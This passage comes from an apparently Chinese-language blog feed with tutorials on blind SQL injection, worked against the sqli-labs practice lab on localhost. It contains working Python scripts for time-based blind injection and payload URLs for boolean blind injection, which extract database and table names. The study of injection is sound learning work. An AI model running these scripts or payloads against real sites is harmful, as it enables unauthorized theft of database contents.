&lt;h2 id=&#34;尝试脚本爆破&#34;&gt;&lt;a href=&#34;#尝试脚本爆破&#34; class=&#34;headerlink&#34; title=&#34;尝试脚本爆破&#34;&gt;&lt;/a&gt;尝试脚本爆破&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;时间盲注只需要这两个模块，一个获取时间，一个请求网址&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;全局就定义了1个参数，数据库可能采用的字符&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;words = &amp;quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-&amp;#123;&amp;#125;, &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;判断database()长度的函数，也就是数据库名的长度，可以减少判断数据库名的时间，可以修改length()内部的参数来判断其他变量的长度，减少跑出名字的时间&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;words = &lt;span class=&#34;string&#34;&gt;&amp;quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-&amp;#123;&amp;#125;, &amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_length&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    length = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/sqli/Less-10/?id=1\&amp;quot; and if(length(database())=%d,sleep(2),0)&amp;quot;&lt;/span&gt; %(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        url = url+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%23&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(url)  &lt;span class=&#34;comment&#34;&gt;#可输出测试是否写错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        start_time = time.time()&lt;span class=&#34;comment&#34;&gt;#请求开始的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        requests.get(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        end_time = time.time()&lt;span class=&#34;comment&#34;&gt;#请求结束的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t = end_time - start_time&lt;span class=&#34;comment&#34;&gt;#时间差&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; t &amp;gt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            length = i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;target_lenght is: &amp;quot;&lt;/span&gt;, length)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_name&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; words:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;#url = &amp;quot;http://127.0.0.1/sqli/Less-10/?id=1\&amp;quot; and if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema=database(),%d,1)=ord(&amp;#x27;%s&amp;#x27;)),sleep(1),0) --+&amp;quot; %(i,j)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/sqli/Less-10/?id=1\&amp;quot; and if(ascii(substr(database(),%d,1))=ord(&amp;#x27;%s&amp;#x27;),sleep(2),0) --+&amp;quot;&lt;/span&gt; %(i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            url = url+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%23&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(url)  &lt;span class=&#34;comment&#34;&gt;#可输出测试是否写错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            start_time = time.time()&lt;span class=&#34;comment&#34;&gt;#请求开始的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            requests.get(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            end_time = time.time()&lt;span class=&#34;comment&#34;&gt;#请求结束的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            t = end_time - start_time&lt;span class=&#34;comment&#34;&gt;#时间差&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; t &amp;gt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                name += j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;target_name is: &amp;quot;&lt;/span&gt;+ name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#target_length()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_name()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以得出，长度为8，库名为&lt;strong&gt;security&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001200020143.png&#34; alt=&#34;image-20221001200020143&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来就改改url就可以爆破其他值了。&lt;/p&gt;
&lt;p&gt;通用&lt;code&gt;GET类型时间盲注&lt;/code&gt;题目脚本小练习&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = &lt;span class=&#34;string&#34;&gt;&amp;#x27;Username: kevin&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;words = &lt;span class=&#34;string&#34;&gt;&amp;#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-.&amp;#123;&amp;#125;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-2.php/SQl-4.php?id=1&amp;#x27;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_length&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	length = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		payload = &lt;span class=&#34;string&#34;&gt;&amp;quot; and if(length(database())=&amp;#123;&amp;#125;,sleep(2),0) %23&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(url + payload)  &lt;span class=&#34;comment&#34;&gt;#可输出测试是否写错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		start = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		requests.get(url + payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		end = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		t = end - start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; t &amp;gt;=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			length = i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;target_length is:&amp;quot;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(length))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_name&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;length&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,length+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; words:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			payload = &lt;span class=&#34;string&#34;&gt;&amp;quot; and if(ascii(mid(database(),&amp;#123;&amp;#125;,1))=ord(&amp;#x27;&amp;#123;&amp;#125;&amp;#x27;),sleep(2),0) %23&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(url + payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			start = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			requests.get(url + payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			end = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			t = end - start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; t &amp;gt;=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				name += j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;target_name is:&amp;quot;&lt;/span&gt;, name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#target_length() #结果为target_length is: 9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_name(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#参数填入上一步的结果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;C:\Users\JcH4liXh\AppData\Roaming\Typora\typora-user-images\image-20221001213601177.png&#34; alt=&#34;image-20221001213601177&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，时间盲注演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</guid>
            <title>布尔盲注</title>
            <link>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</link>
            <category>SQL注入探究</category>
            <pubDate>Sat, 01 Oct 2022 01:41:34 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL-注入之布尔盲注&#34;&gt;&lt;a href=&#34;#SQL-注入之布尔盲注&#34; class=&#34;headerlink&#34; title=&#34;SQL 注入之布尔盲注&#34;&gt;&lt;/a&gt;SQL 注入之布尔盲注&lt;/h1&gt;&lt;p&gt;本篇使用布尔盲注。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;布尔盲注&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt;&lt;br&gt;注入的时候只会返回&lt;code&gt;True和False&lt;/code&gt;，所以布尔盲注就是根据页面显示的是&lt;code&gt;True还是False&lt;/code&gt;进行猜测数据库中的信息。&lt;/p&gt;
&lt;p&gt;布尔盲注需要几个函数的辅助，就先来了解一下这几个函数&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;length()函数可返回字符串的长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;substring()函数可以截取字符串，可指定开始的位置和截取的长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ord()函数可以返回单个字符的ASCII码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char()函数可将ASCII码转换为对应的字符&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;具体的用法可以参考大佬的博客&lt;a href=&#34;https://www.jianshu.com/p/f0174ea6c69d&#34;&gt;Mysql语法介绍&lt;/a&gt;，接下来就通过&lt;strong&gt;sql-labs&lt;/strong&gt;练习布尔盲注。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;判断注入点&lt;/strong&gt;（也就是闭合符号）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现输入&lt;code&gt;id=1&amp;#39;&lt;/code&gt;没有错误回显&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001005755289.png&#34; alt=&#34;image-20221001005755289&#34;&gt;&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;id=1&amp;#39;&lt;/code&gt;后再加上&lt;strong&gt;注释符号&lt;/strong&gt;后又回显正确，所以判定闭合符号为&lt;code&gt;&amp;#39;&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001005844512.png&#34; alt=&#34;image-20221001005844512&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆数据库长度&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于我们知道 &lt;code&gt;select uname = &amp;#39;id&amp;#39; and 1 from xxxx&lt;/code&gt; 在id有效的情况下，加入&lt;code&gt;and 1&lt;/code&gt;不会影响整体判断&lt;/p&gt;
&lt;p&gt;那么，这里的1可以被任何的查询正确的&lt;code&gt;布尔型判断语句&lt;/code&gt;返回结果所替代，比如&lt;code&gt;length(database()) =x&lt;/code&gt;就可以来代替 1 这个值。&lt;/p&gt;
&lt;p&gt;只有当x等于正确的数据库长度时，才能使&lt;code&gt;and 1 成立&lt;/code&gt;，才能使整个查询语句回显正确的内容&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; and length(database())=1 --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; and length(database())=2 --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; and length(database())=8 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001010826646.png&#34; alt=&#34;image-20221001010826646&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001010848025.png&#34; alt=&#34;image-20221001010848025&#34;&gt;&lt;/p&gt;
&lt;p&gt;手工注入的话就要一遍一遍的试试，将后面的长度不断增大，最后得出数据库名的长度为&lt;code&gt;8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆数据库名&lt;/strong&gt;&lt;br&gt;知道了数据库名的长度，接下来就来爆破数据库名&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以这一句为基础&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;and 1 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;继续深入构造爆破查询语句：&lt;/p&gt;
&lt;h3 id=&#34;注入步骤&#34;&gt;&lt;a href=&#34;#注入步骤&#34; class=&#34;headerlink&#34; title=&#34;注入步骤&#34;&gt;&lt;/a&gt;注入步骤&lt;/h3&gt;&lt;p&gt;布尔盲注爆破数据库名&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;and ascii(substr(database(),1,1))=1 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后交给&lt;strong&gt;BurpSuit&lt;/strong&gt;抓包，选择&lt;strong&gt;Send to Intruder&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;清空变量&#34;&gt;&lt;a href=&#34;#清空变量&#34; class=&#34;headerlink&#34; title=&#34;清空变量&#34;&gt;&lt;/a&gt;清空变量&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;image-20221001011237616.png&#34; alt=&#34;image-20221001011237616&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;设置爆破变量&#34;&gt;&lt;a href=&#34;#设置爆破变量&#34; class=&#34;headerlink&#34; title=&#34;设置爆破变量&#34;&gt;&lt;/a&gt;设置爆破变量&lt;/h4&gt;&lt;p&gt;首先我们确定好&lt;/p&gt;
&lt;p&gt; ascii(substr(database(),&lt;code&gt;1&lt;/code&gt;,1))=&lt;code&gt;1&lt;/code&gt; —+ 这一句中，我标识出来的两个位置【需要我们使用工具&lt;strong&gt;爆破&lt;/strong&gt;】。&lt;/p&gt;
&lt;p&gt;使用Add$ 来为想要爆破的变量添加上变量符号&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001011541978.png&#34; alt=&#34;image-20221001011541978&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;选择爆破取值范围&#34;&gt;&lt;a href=&#34;#选择爆破取值范围&#34; class=&#34;headerlink&#34; title=&#34;选择爆破取值范围&#34;&gt;&lt;/a&gt;选择爆破取值范围&lt;/h4&gt;&lt;p&gt;第一个位置， ascii(substr(database(),&lt;code&gt;1&lt;/code&gt;,1))=1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001011859324.png&#34; alt=&#34;image-20221001011859324&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二个位置， ascii(substr(database(),1,1))=&lt;code&gt;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001012047075.png&#34; alt=&#34;image-20221001012047075&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;开始爆破&#34;&gt;&lt;a href=&#34;#开始爆破&#34; class=&#34;headerlink&#34; title=&#34;开始爆破&#34;&gt;&lt;/a&gt;开始爆破&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;image-20221001012115998.png&#34; alt=&#34;image-20221001012115998&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于我们的包总长度&lt;code&gt;根据回显内容不同而发生变化&lt;/code&gt;，因此，只有&lt;strong&gt;当取值正确的时候包长度会跟其他错误的情况不一样&lt;/strong&gt;，看下图有8个情况和其他次数有不一样的结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001012215106.png&#34; alt=&#34;image-20221001012215106&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;payload1(数据库名第n个字符)&lt;/th&gt;
&lt;th&gt;payload2(数据库名第n个字符是什么字符)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;115—&amp;gt;’s’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;101—&amp;gt;’e’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;99  —&amp;gt;’c’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;117—&amp;gt;’u’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;114—&amp;gt;’r’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;105—&amp;gt;’i’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;116—&amp;gt;’t’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;121—&amp;gt;’y’&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;综上，数据库名是&lt;code&gt;security&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;爆破表名，同理&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
